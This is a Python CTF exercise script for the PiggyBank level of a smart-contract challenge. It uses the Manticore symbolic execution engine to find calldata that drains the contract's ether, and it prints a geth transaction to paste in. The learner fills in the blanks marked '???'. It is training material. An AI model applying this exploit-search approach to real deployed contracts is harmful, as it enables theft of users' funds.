'''
In this level, we'll have to know the contract balance of the piggy bank
We know that this is .3 ether, but we have to convert that to wei
(hint: this is done in the first manticore script with .5 ether)
There's one more blank (???) that you need to fill in which is the number of bytes in a 256bit uint.
You'll also need to fill in your wallet/ctf address in this file or on the command line (like the previous level)
'''

from manticore.ethereum import ManticoreEVM
import binascii
import sys

from_address = int(sys.argv[1], 16) if len(sys.argv)>1 else "<your address here>"
si_level_address = int(sys.argv[2], 16) if len(sys.argv)>2 else "<SI ctf level address>"
sol_file = sys.argv[3] if len(sys.argv)>3 else "../SI_ctf_levels/PiggyBank.sol"
gas = 100000
contract_balance = ???

# read in the contract source
with open(sol_file, "r") as f:
    contract_src = f.read()

# instantiate manticore's Ethereum Virtual Machine
m = ManticoreEVM()

# create a virtual user account on the EVM
user_account = m.create_account(address=from_address, balance=contract_balance)
# create our victim contract
contract_account = m.solidity_create_contract(
    contract_src, # a string containing the source file
    contract_name="CharliesPiggyBank", # the contract in the source file that we want to create (a file could have multiple contracts)
    owner=user_account, # the creator address for this first exploit, we can use our own account to create it (this may not be true for future levels)
    balance=contract_balance, # the value to send to the contructor (this will actually be deducted from our virtual address)
    args=(0,0) # in the downloaded contract, these arguments aren't used
    )

# ethereum contracts only have one entry point and use a switch statement to determine which function was called
# solidity compiles this switch statement to check the first 4 bytes of the input and match this to the first 4 bytes of the keccak256 hash of the function signature
#   more explanation of this in the donation solution file
# to allow manticore to call any function, we'll setup the symbolic execution engine so that it has 4 free bytes to play with
# we also need some number of bytes to hold the 256 bit uint, please fill this in
sym_args = m.make_symbolic_buffer(4+???)
# now, we contrain the execution with a transaction
m.transaction(caller=user_account, address=contract_account.address, data=sym_args, value=0, gas=gas)

# for states that are still running (haven't reverted due to our transaction contraint) let's iterate through them and see if any allow for an exploit
for state in m.running_states:
    world = state.platform
    # stealing back all the ether is a good way of proving that an exploit exists
    # let's constrain our state to that
    if state.can_be_true(world.get_balance(user_account.address) == contract_balance):
      state.constraints.add(world.get_balance(user_account.address) == contract_balance)
      conc_args = state.solve_one(sym_args)
      # print out our transaction
      print("eth.sendTransaction({data:\"0x"+binascii.hexlify(conc_args).decode('utf-8')+"\", from:\""+hex(from_address)+"\", to:\""+hex(si_level_address)+"\", gas:"+str(gas)+"})")
      # this prints the exploit out in a format that you can easily paste into geth to win
      sys.exit(0) # we only needed one state!

print("No valid states found")
